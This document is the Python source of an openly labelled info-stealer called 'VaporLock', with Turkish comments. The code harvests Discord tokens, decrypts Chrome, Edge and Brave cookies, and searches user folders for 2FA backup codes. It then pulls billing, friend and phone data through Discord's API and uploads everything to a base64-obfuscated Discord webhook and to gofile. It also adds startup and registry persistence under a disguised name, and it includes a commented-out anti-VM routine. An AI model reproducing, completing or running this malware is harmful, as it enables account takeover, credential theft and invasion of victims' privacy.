# VaporLock - Python Stealer (Test Modunda, Anti-VM Yorumlu)

import os
import sys
import json
import sqlite3
import shutil
import subprocess
import tempfile
import zipfile
import base64
import re
import time
import uuid
import socket
import platform
import ctypes
import winreg
import threading
from urllib import request as urllib_request
from urllib import parse as urllib_parse

# Üçüncü parti
try:
    import requests
    REQUESTS_OK = True
except:
    REQUESTS_OK = False

try:
    from PIL import ImageGrab
    PIL_OK = True
except:
    PIL_OK = False

try:
    import win32crypt
    WIN32CRYPT_OK = True
except:
    WIN32CRYPT_OK = False

try:
    import wmi
    WMI_OK = True
except:
    WMI_OK = False

# Base64 kodlanmış hassas stringler
B64_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg=="
B64_RUN_KEY = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"
B64_STARTUP_FOLDER = "TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtXFN0YXJ0VXA="

def decode(s: str) -> str:
    return base64.b64decode(s).decode('utf-8')

WEBHOOK_URL = decode(B64_WEBHOOK)

# ------------------- JUNK CODE -------------------
def junk_loop():
    for _ in range(500):
        _ = hash(str(_)) * 0.1 + 1.23
    return "junk"

# ------------------- ANTI-VM (TÜM SATIRLAR YORUMLU) -------------------
# def anti_vm():
#     try:
#         mac = uuid.getnode()
#         mac_hex = ':'.join(('%012X' % mac)[i:i+2] for i in range(0,12,2))
#         if mac_hex.startswith('08:00:27') or mac_hex.startswith('00:0C:29') or mac_hex.startswith('00:50:56'):
#             sys.exit(1)
#         class MEMORYSTATUSEX(ctypes.Structure):
#             _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
#                         ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
#                         ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
#                         ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
#                         ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
#         mem = MEMORYSTATUSEX()
#         mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
#         ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
#         if mem.ullTotalPhys // (1024**3) < 4:
#             sys.exit(1)
#         free = ctypes.c_ulonglong(0)
#         total = ctypes.c_ulonglong(0)
#         ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, ctypes.byref(total), None)
#         if total.value // (1024**3) < 80:
#             sys.exit(1)
#         output = subprocess.check_output("tasklist", shell=True).decode('cp850', errors='ignore')
#         for proc in ['vboxservice', 'vmtoolsd', 'VBoxTray', 'vmwaretray']:
#             if proc.lower() in output.lower():
#                 sys.exit(1)
#         try:
#             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
#             val = winreg.QueryValueEx(key, "Identifier")[0]
#             if "vmware" in val.lower() or "virtualbox" in val.lower():
#                 sys.exit(1)
#         except:
#             pass
#     except:
#         pass

# ------------------- SİSTEM BİLGİSİ -------------------
def get_system_info():
    info = {}
    try:
        info['hostname'] = socket.gethostname()
        info['username'] = os.getlogin()
        info['os_version'] = platform.platform()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['local_ip'] = s.getsockname()[0]
        s.close()
        try:
            with urllib_request.urlopen("https://api.ipify.org", timeout=5) as f:
                info['public_ip'] = f.read().decode()
        except:
            info['public_ip'] = "Unknown"
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            info['cpu'] = winreg.QueryValueEx(key, "ProcessorNameString")[0]
        except:
            info['cpu'] = platform.processor()
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        info['ram_gb'] = round(mem.ullTotalPhys / (1024**3), 2)
        if WMI_OK:
            try:
                c = wmi.WMI()
                for gpu in c.Win32_VideoController():
                    if gpu.Name:
                        info['gpu'] = gpu.Name
                        break
            except:
                info['gpu'] = "Unknown"
        else:
            info['gpu'] = "Unknown"
        info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        info['error'] = str(e)
    return info

# ------------------- DISCORD TOKEN TOPLAMA (LEVELDB) -------------------
def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb")
    ]
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    for p in discord_paths:
        if not os.path.isdir(p):
            continue
        for f in glob.glob(os.path.join(p, "*.log")) + glob.glob(os.path.join(p, "*.ldb")):
            try:
                with open(f, 'r', errors='ignore') as file:
                    content = file.read()
                    tokens.extend(token_regex.findall(content))
            except:
                pass
    return list(set(tokens))

# ------------------- TARAYICI ÇEREZLERİ TOPLAMA -------------------
def get_browser_cookies():
    cookies = []
    browser_profiles = []
    local_appdata = os.environ.get('LOCALAPPDATA', '')
    for browser, subpath in [('Chrome', 'Google\\Chrome\\User Data\\Default'),
                              ('Edge', 'Microsoft\\Edge\\User Data\\Default'),
                              ('Brave', 'BraveSoftware\\Brave-Browser\\User Data\\Default')]:
        full = os.path.join(local_appdata, subpath)
        if os.path.isdir(full):
            browser_profiles.append((browser, full))
    for name, profile_path in browser_profiles:
        cookie_file = os.path.join(profile_path, "Cookies")
        if not os.path.exists(cookie_file):
            continue
        temp_db = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + ".db")
        try:
            shutil.copy2(cookie_file, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, cname, enc_val in cursor.fetchall():
                try:
                    if WIN32CRYPT_OK:
                        decrypted = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    else:
                        decrypted = "[ENCRYPTED]"
                except:
                    decrypted = "[ERROR]"
                cookies.append({"browser": name, "host": host, "name": cname, "value": decrypted})
            conn.close()
            os.remove(temp_db)
        except:
            pass
    return cookies

# ------------------- YEDEK KODLARI TOPLAMA -------------------
def collect_backup_codes():
    found_files = []
    keywords = ['backup', '2fa', 'mfa', 'discord', 'code', 'auth']
    patterns = [
        re.compile(r'backup.*code', re.I),
        re.compile(r'2fa.*code', re.I),
        re.compile(r'discord.*backup', re.I),
        re.compile(r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}'),
        re.compile(r'[A-Z0-9]{8}-[A-Z0-9]{8}')
    ]
    search_dirs = [
        os.path.expandvars("%USERPROFILE%\\Desktop"),
        os.path.expandvars("%USERPROFILE%\\Documents"),
        os.path.expandvars("%USERPROFILE%\\Downloads")
    ]
    for search_dir in search_dirs:
        if not os.path.isdir(search_dir):
            continue
        try:
            for file in os.listdir(search_dir):
                if not file.lower().endswith('.txt'):
                    continue
                file_path = os.path.join(search_dir, file)
                try:
                    if os.path.getsize(file_path) > 1024*1024:
                        continue
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                    found = False
                    for kw in keywords:
                        if kw in file.lower():
                            found = True
                            break
                    if not found:
                        for pat in patterns:
                            if pat.search(content):
                                found = True
                                break
                    if found:
                        found_files.append(file_path)
                except:
                    pass
        except:
            pass
    return found_files

# ------------------- DISCORD API İŞLEMLERİ -------------------
def discord_api_request(token, endpoint, method='GET', data=None):
    url = f"https://discord.com/api/v9/{endpoint}"
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        if method == 'GET':
            resp = requests.get(url, headers=headers, timeout=10)
        else:
            resp = requests.post(url, headers=headers, json=data, timeout=10)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return None

def get_user_info(token):
    return discord_api_request(token, "users/@me")

def get_billing(token):
    data = discord_api_request(token, "users/@me/billing/payment-sources")
    if not data or not isinstance(data, list):
        return "None"
    billing_icons = []
    for item in data:
        if item.get('invalid'):
            continue
        if item.get('type') == 2:
            billing_icons.append("💰")  # PayPal
        elif item.get('type') == 1:
            billing_icons.append("💳")
    return " ".join(billing_icons) if billing_icons else "None"

def get_friends(token):
    data = discord_api_request(token, "users/@me/relationships")
    if not data or not isinstance(data, list):
        return {"length": 0, "users": "Account Locked", "hq_friends": [], "total_hq_friends": 0}
    friends = [rel for rel in data if rel.get('type') == 1]
    friend_names = []
    hq_friends = []
    rare_badge_ids = [1<<0, 1<<9, 1<<17, 1<<18, 1<<3, 1<<14, 1<<1, 1<<2]
    for friend in friends:
        user = friend.get('user', {})
        flags = user.get('public_flags', 0)
        rare = any(flags & bid for bid in rare_badge_ids)
        name = user.get('username', 'Unknown')
        friend_names.append(name)
        if rare:
            hq_friends.append(name)
    return {
        "length": len(friends),
        "users": "\n".join(friend_names) if friend_names else "None",
        "hq_friends": hq_friends,
        "total_hq_friends": len(hq_friends)
    }

def get_badges(user_id, token):
    profile = discord_api_request(token, f"users/{user_id}/profile")
    if not profile:
        return "No Badges"
    user = profile.get('user', {})
    flags = user.get('public_flags', 0)
    badge_emojis = []
    badges_map = {
        1<<0: "👑", 1<<1: "🤝", 1<<2: "🎖️", 1<<3: "🐛1", 1<<9: "🌟",
        1<<14: "🐛2", 1<<17: "🤖", 1<<18: "🛡️"
    }
    for flag, emoji in badges_map.items():
        if flags & flag:
            badge_emojis.append(emoji)
    if profile.get('premium_since'):
        badge_emojis.append("⭐")  # Nitro
    return " ".join(badge_emojis) if badge_emojis else "No Badges"

def get_phone(token):
    user = get_user_info(token)
    return user.get('phone') if user else None

# ------------------- GO FILE UPLOAD -------------------
def upload_to_gofile(file_path):
    for attempt in range(3):
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                resp = requests.post("https://upload.gofile.io/uploadfile", files=files, timeout=60)
                if resp.status_code == 200 and resp.json().get('status') == 'ok':
                    return resp.json().get('data', {}).get('downloadPage')
        except:
            time.sleep(2)
    return None

# ------------------- ZİPLEME VE GÖNDERME -------------------
def zip_and_send(cookie_list, backup_files, system_info, discord_tokens, token_details, temp_dir):
    zip_path = os.path.join(temp_dir, "data.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        # cookies.json
        with open(os.path.join(temp_dir, "cookies.json"), "w") as f:
            json.dump(cookie_list, f)
        zf.write(os.path.join(temp_dir, "cookies.json"), "cookies.json")
        # backup codes
        for bf in backup_files:
            zf.write(bf, os.path.basename(bf))
        # system info
        with open(os.path.join(temp_dir, "system.json"), "w") as f:
            json.dump(system_info, f)
        zf.write(os.path.join(temp_dir, "system.json"), "system.json")
        # discord tokens
        with open(os.path.join(temp_dir, "tokens.txt"), "w") as f:
            f.write("\n".join(discord_tokens))
        zf.write(os.path.join(temp_dir, "tokens.txt"), "tokens.txt")
        # token details
        with open(os.path.join(temp_dir, "token_details.json"), "w") as f:
            json.dump(token_details, f)
        zf.write(os.path.join(temp_dir, "token_details.json"), "token_details.json")
    # upload to gofile
    gofile_link = upload_to_gofile(zip_path)
    # also send via webhook
    if REQUESTS_OK:
        try:
            with open(zip_path, 'rb') as f:
                files = {'file': f}
                requests.post(WEBHOOK_URL, files=files, timeout=30)
        except:
            pass
    return gofile_link

# ------------------- PERSISTENCE -------------------
def persistence():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            return
        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        dest = os.path.join(startup_folder, "winsvc.exe")
        shutil.copy2(exe_path, dest)
        key_path = decode(B64_RUN_KEY)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        rand_name = uuid.uuid4().hex[:8]
        winreg.SetValueEx(key, rand_name, 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
    except:
        pass

# ------------------- ANA FONKSİYON -------------------
def main():
    junk_loop()
    # anti_vm()  # Yorumlu
    temp_dir = tempfile.mkdtemp()
    try:
        # Toplama işlemleri
        sys_info = get_system_info()
        tokens = get_discord_tokens()
        cookies = get_browser_cookies()
        backups = collect_backup_codes()
        # Her token için Discord API
        token_details = []
        for tok in tokens:
            user = get_user_info(tok)
            if not user:
                continue
            billing = get_billing(tok)
            friends = get_friends(tok)
            badges = get_badges(user.get('id'), tok)
            phone = get_phone(tok)
            token_details.append({
                "token": tok,
                "user": user,
                "billing": billing,
                "friends": friends,
                "badges": badges,
                "phone": phone
            })
        # ZIP'le ve gönder
        zip_and_send(cookies, backups, sys_info, tokens, token_details, temp_dir)
        persistence()
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
